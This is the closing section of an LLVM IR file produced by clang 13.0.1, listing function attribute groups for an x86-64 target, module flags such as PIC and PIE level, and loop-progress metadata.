attributes #1 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { nounwind readonly willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { argmemonly nofree nounwind willreturn writeonly }
attributes #5 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #6 = { noreturn nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #7 = { nofree nosync nounwind willreturn }
attributes #8 = { nounwind readonly willreturn }
attributes #9 = { nounwind }
attributes #10 = { nounwind readnone willreturn }
attributes #11 = { noreturn nounwind }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"clang version 13.0.1"}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
!13 = distinct !{!13, !7}
!14 = distinct !{!14, !7}
!15 = distinct !{!15, !7}
!16 = distinct !{!16, !7}
!17 = distinct !{!17, !7}
!18 = distinct !{!18, !7}
!19 = distinct !{!19, !7}
!20 = distinct !{!20, !7}
!21 = distinct !{!21, !7}
